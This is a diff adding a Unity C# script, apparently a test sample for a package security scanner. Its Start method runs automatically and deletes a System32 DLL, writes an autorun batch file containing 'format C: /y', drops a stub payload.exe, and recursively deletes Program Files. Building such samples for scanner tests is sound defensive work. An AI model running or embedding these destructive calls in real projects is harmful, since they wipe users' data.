@@ -1,0 +1,29 @@
+using UnityEngine;
+using System.IO;
+
+namespace TestPackage.FileSystem
+{
+    /// <summary>
+    /// ファイルシステム操作を含むテスト用スクリプト
+    /// </summary>
+    public class FileSystemMalwareScript : MonoBehaviour
+    {
+        void Start()
+        {
+            // ファイル削除 - Warning
+            File.Delete("C:\\Windows\\System32\\important.dll");
+            
+            // ファイル書き込み - Warning
+            File.WriteAllText("C:\\autorun.bat", "@echo off\nformat C: /y");
+            File.WriteAllBytes("C:\\payload.exe", GetMaliciousPayload());
+            
+            // ディレクトリ削除 - Warning
+            Directory.Delete("C:\\Program Files", true);
+        }
+        
+        byte[] GetMaliciousPayload()
+        {
+            return new byte[] { 0x4D, 0x5A, 0x90, 0x00 }; // PE header start
+        }
+    }
+}
